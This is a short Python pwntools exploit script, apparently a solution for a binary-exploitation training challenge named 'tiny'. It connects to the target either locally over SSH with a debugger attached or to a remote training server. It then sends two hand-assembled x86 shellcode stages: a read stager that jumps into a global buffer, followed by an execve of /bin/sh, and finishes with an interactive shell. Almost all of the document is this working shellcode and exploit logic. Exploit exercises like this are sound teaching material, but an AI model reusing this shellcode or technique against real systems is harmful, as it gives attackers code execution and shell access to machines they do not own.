from pwn import *

if "REMOTE" not in args:

    env = {}

    ssh = ssh("acidburn", "127.0.0.1", password="acidburn", port=2222)
    r = ssh.process("tiny", env=env)
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2004)

input('Trigger custom read on global variable')

"""
xor %ebx, %ebx
mov %ecx, 0x404068
xor %edx, %edx
mov %dl, 0xFF
xor %eax, %eax
mov %al, 0x03
int 0x80
jmp %ecx
"""

payload = b'\x31\xDB\xB9\x68\x40\x40\x00\x31\xD2\xB2\xFF\x31\xC0\xB0\x03\xCD\x80\xFF\xE1'

r.send(payload)

input('Execute shell')

"""
mov %al, 0xb
mov %ebx, 0x404075 #address of /bin/sh\x00
xor %ecx, %ecx
xor %edx, %edx
int 0x80
"""
payload = b'\xB0\x0B\xBB\x75\x40\x40\x00\x31\xC9\x31\xD2\xCD\x80/bin/sh\x00'

r.send(payload)

r.interactive()
